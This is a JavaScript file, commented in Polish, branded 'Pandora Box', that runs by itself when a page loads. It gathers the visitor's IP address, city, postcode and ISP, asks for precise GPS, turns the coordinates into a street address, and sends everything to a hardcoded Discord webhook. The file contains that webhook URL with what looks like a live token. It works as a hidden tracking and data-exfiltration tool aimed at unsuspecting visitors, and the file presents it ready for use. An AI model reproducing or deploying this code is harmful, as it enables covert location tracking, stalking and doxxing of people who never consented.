const WEBHOOK_URL = "https://discord.com/api/webhooks/1473802841083740358/Fa1WpPDsIQiDj6aNqjIJj1jXvn81VJZT7nvALQpr4BDDBFufLuaxpySl1tq0DXFVwtX1";

// Funkcja do pobrania dokładnej lokalizacji GPS (wymaga zgody użytkownika)
async function getGPSLocation() {
    return new Promise((resolve) => {
        if ('geolocation' in navigator) {
            console.log('📍 Attempting to get precise GPS location...');
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    console.log('✅ GPS location obtained:', position.coords);
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        heading: position.coords.heading,
                        speed: position.coords.speed
                    });
                },
                (error) => {
                    console.log('⚠️ GPS denied or unavailable:', error.message);
                    resolve(null);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        } else {
            console.log('⚠️ Geolocation not supported');
            resolve(null);
        }
    });
}

// Funkcja do reverse geocoding (zamiana współrzędnych na adres)
async function reverseGeocode(lat, lon) {
    try {
        console.log('🗺️ Reverse geocoding coordinates...');
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
            headers: {
                'User-Agent': 'PandoraBox/1.0'
            }
        });
        const data = await response.json();
        console.log('✅ Address details received:', data);
        return data;
    } catch (error) {
        console.error('❌ Reverse geocoding failed:', error);
        return null;
    }
}

// Funkcja do pobrania szczegółowych danych IP
async function getDetailedIPInfo() {
    try {
        console.log('🔍 Fetching IP information...');
        
        // Używamy ipapi.co dla lepszych danych
        const response = await fetch('https://ipapi.co/json/', {
            method: 'GET'
        });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const data = await response.json();
        console.log('✅ IP data received:', data);
        return data;
    } catch (error) {
        console.error('❌ Error fetching IP info:', error);
        // Fallback do ip-api.com z wszystkimi dostępnymi polami
        try {
            console.log('🔄 Trying alternative API...');
            const fallbackResponse = await fetch('https://ip-api.com/json/?fields=66846719', {
                method: 'GET'
            });
            const fallbackData = await fallbackResponse.json();
            console.log('✅ Fallback data received:', fallbackData);
            return {
                ip: fallbackData.query,
                country_name: fallbackData.country,
                country_code: fallbackData.countryCode,
                city: fallbackData.city,
                region: fallbackData.regionName,
                postal: fallbackData.zip,
                latitude: fallbackData.lat,
                longitude: fallbackData.lon,
                timezone: fallbackData.timezone,
                org: fallbackData.org || fallbackData.as,
                isp: fallbackData.isp
            };
        } catch (fallbackError) {
            console.error('❌ Fallback also failed:', fallbackError);
            return null;
        }
    }
}

// Funkcja do wysłania danych na Discord
async function sendToDiscord(ipData, gpsData = null, addressData = null) {
    try {
        console.log('📤 Preparing webhook payload...');
        
        // Sprawdź czy to Polska
        const isPoland = ipData.country_code === 'PL' || ipData.country_name === 'Poland';
        
        // Decyduj które współrzędne użyć (GPS > IP)
        const latitude = gpsData?.latitude || ipData.latitude;
        const longitude = gpsData?.longitude || ipData.longitude;
        
        // Przygotuj pola do embedu
        const fields = [
            {
                name: "🌐 IP Address",
                value: ipData.ip || 'Unknown',
                inline: true
            },
            {
                name: "🌍 Country",
                value: ipData.country_name || 'Unknown',
                inline: true
            },
            {
                name: "🏙️ City",
                value: ipData.city || 'Unknown',
                inline: true
            },
            {
                name: "📍 Region",
                value: ipData.region || 'Unknown',
                inline: true
            },
            {
                name: "📮 ZIP Code",
                value: ipData.postal || 'Unknown',
                inline: true
            }
        ];
        
        // Dodaj ISP/Organization
        if (ipData.org || ipData.isp) {
            fields.push({
                name: "🏢 ISP/Organization",
                value: ipData.org || ipData.isp || 'Unknown',
                inline: false
            });
        }
        
        // Dodaj dokładne współrzędne GPS jeśli dostępne
        if (gpsData) {
            fields.push({
                name: "📍 GPS Coordinates (PRECISE)",
                value: `${latitude}, ${longitude}`,
                inline: false
            });
            
            if (gpsData.accuracy) {
                fields.push({
                    name: "🎯 GPS Accuracy",
                    value: `±${Math.round(gpsData.accuracy)}m`,
                    inline: true
                });
            }
            
            // Link do Google Maps z dokładnymi współrzędnymi
            fields.push({
                name: "🗺️ Google Maps",
                value: `[Open Location](https://www.google.com/maps?q=${latitude},${longitude})`,
                inline: true
            });
            
            if (gpsData.altitude) {
                fields.push({
                    name: "🏔️ Altitude",
                    value: `${Math.round(gpsData.altitude)}m`,
                    inline: true
                });
            }
        } else if (latitude && longitude) {
            fields.push({
                name: "🗺️ Coordinates (IP-based)",
                value: `${latitude}, ${longitude}\n[Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
                inline: false
            });
        }
        
        // Dodaj szczegółowy adres jeśli dostępny (z reverse geocoding)
        if (addressData && addressData.address) {
            const addr = addressData.address;
            let fullAddress = [];
            
            if (addr.road) fullAddress.push(addr.road);
            if (addr.house_number) fullAddress.push(addr.house_number);
            if (addr.suburb) fullAddress.push(addr.suburb);
            if (addr.city || addr.town || addr.village) {
                fullAddress.push(addr.city || addr.town || addr.village);
            }
            if (addr.postcode) fullAddress.push(addr.postcode);
            if (addr.country) fullAddress.push(addr.country);
            
            if (fullAddress.length > 0) {
                fields.push({
                    name: "📮 Full Address (GPS)",
                    value: fullAddress.join(', '),
                    inline: false
                });
            }
            
            // Dodaj nazwę miejsca jeśli dostępna
            if (addressData.display_name) {
                fields.push({
                    name: "📌 Location Details",
                    value: addressData.display_name.substring(0, 1024),
                    inline: false
                });
            }
        }
        
        // Dodaj timezone jeśli dostępne
        if (ipData.timezone) {
            const localTime = new Date().toLocaleString('pl-PL', { timeZone: ipData.timezone });
            fields.push({
                name: "🕐 Local Time",
                value: `${localTime} (${ipData.timezone})`,
                inline: false
            });
        }
        
        // Dodaj ASN jeśli to Polska
        if (isPoland && ipData.asn) {
            fields.push({
                name: "🔢 ASN",
                value: ipData.asn,
                inline: true
            });
        }
        
        // Dodaj timestamp
        const timestamp = new Date().toISOString();
        
        const description = gpsData 
            ? "🎯 **PRECISE GPS LOCATION OBTAINED!**" + (isPoland ? " 🇵🇱" : "")
            : isPoland 
                ? "🇵🇱 **Visitor from Poland detected!**" 
                : "Visitor IP information";
        
        const webhookPayload = {
            content: "🚨 **New Pandora Box Visitor**",
            embeds: [{
                title: "📊 Visitor Information",
                color: gpsData ? 0xFF0000 : 0xBA0000,
                description: description,
                fields: fields,
                footer: {
                    text: "Programmed by prod.orzech | Pandora Box",
                    icon_url: "https://media.discordapp.net/attachments/1241105227826855997/1473801023326912716/ChatGPT_Image_17_lut_2026_17_29_12.png"
                },
                thumbnail: {
                    url: "https://media.discordapp.net/attachments/1241105227826855997/1473801023326912716/ChatGPT_Image_17_lut_2026_17_29_12.png"
                },
                timestamp: timestamp
            }]
        };
        
        console.log('📤 Sending webhook...', webhookPayload);
        
        const webhookResponse = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(webhookPayload)
        });
        
        if (webhookResponse.ok) {
            console.log('✅ Webhook sent successfully!', webhookResponse.status);
        } else {
            const errorText = await webhookResponse.text();
            console.error('❌ Webhook failed:', webhookResponse.status, errorText);
        }
        
    } catch (error) {
        console.error('❌ Error sending webhook:', error);
    }
}

// Główna funkcja - uruchamiana automatycznie
(async function init() {
    try {
        console.log('🚀 Starting advanced location tracking...');
        console.log('⏱️ This may take a few seconds...');
        
        // Pobierz dane IP
        const ipData = await getDetailedIPInfo();
        
        if (!ipData || !ipData.ip) {
            console.error('❌ No IP data available');
            return;
        }
        
        console.log('✅ IP data collected');
        
        // Spróbuj pobrać GPS (w tle, nie blokuj)
        console.log('📍 Attempting to get precise GPS location...');
        console.log('⚠️ Browser will ask for permission - please ALLOW for precise location');
        
        const gpsData = await getGPSLocation();
        
        let addressData = null;
        
        // Jeśli mamy GPS, zrób reverse geocoding
        if (gpsData && gpsData.latitude && gpsData.longitude) {
            console.log('✅ GPS location obtained!');
            console.log(`📍 Precise coordinates: ${gpsData.latitude}, ${gpsData.longitude}`);
            console.log(`🎯 Accuracy: ±${Math.round(gpsData.accuracy)}m`);
            
            // Poczekaj chwilę przed reverse geocoding (limit rate)
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            addressData = await reverseGeocode(gpsData.latitude, gpsData.longitude);
            
            if (addressData) {
                console.log('✅ Full address resolved!');
            }
        } else {
            console.log('⚠️ GPS not available, using IP-based location only');
        }
        
        // Wyślij wszystkie dane na webhook
        await sendToDiscord(ipData, gpsData, addressData);
        
        console.log('✅ Location tracking completed successfully!');
        
    } catch (error) {
        console.error('❌ Fatal error:', error);
    }
})();
